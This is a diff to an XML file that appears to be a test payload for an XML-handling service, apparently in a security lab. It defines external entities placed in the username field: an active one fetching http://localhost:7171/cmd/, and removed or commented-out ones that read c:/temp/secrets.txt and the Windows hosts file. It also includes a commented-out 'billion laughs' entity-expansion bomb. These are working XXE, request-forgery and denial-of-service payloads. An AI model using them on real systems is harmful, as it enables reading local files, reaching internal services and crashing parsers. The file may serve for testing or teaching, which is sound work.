@@ -1,10 +1,27 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE user [
-        <!ENTITY xxe SYSTEM "file:///c:/temp/secrets.txt" >
-        <!--<!ENTITY xxe SYSTEM "http://localhost:7171/xmli/users" >-->
+        <!--<!ENTITY xxe SYSTEM "file:///c:/temp/secrets.txt" >-->
+
+        <!ENTITY xxe SYSTEM "http://localhost:7171/cmd/" >
+
         <!--<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts" >-->
+
+        <!--<!ENTITY a0 "   lollollollollollollollollollollollollollollollollollollollollollollollollollollolloll
+                        lollollollollollollollollollollollollollollollollollollollollollollollollollollolloll
+                        lollollollollollollollollollollollollollollollollollollollollollollollollollollolloll
+                        lollollollollollollollollollollollollollollollollollollollollollollollollollollolloll
+                        lollollollollollollollollollollollollollollollollollollollollollollollollollollolloll
+                        lollollollollollollollollollollollollollollollollollollollollollollollollollollolloll
+                        lollollollollollollollollollollollollollollollollollollollollollollollollollollolloll
+                        lollollollollollollollollollollollollollollollollollollollollollollollollollollolloll">
+        <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
+        <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
+        <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
+        <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
+        <!ENTITY xxe "&a4;&a4;&a4;&a4;&a4;">-->
+
         ]>
-<user id="001">
+<user id="ec77d4a3-156a-4464-bc9e-ed9835661b75">
     <username>&xxe;</username>
     <password>7815696ecbf1c96e6894b779456d330e</password>
     <group>Users</group>
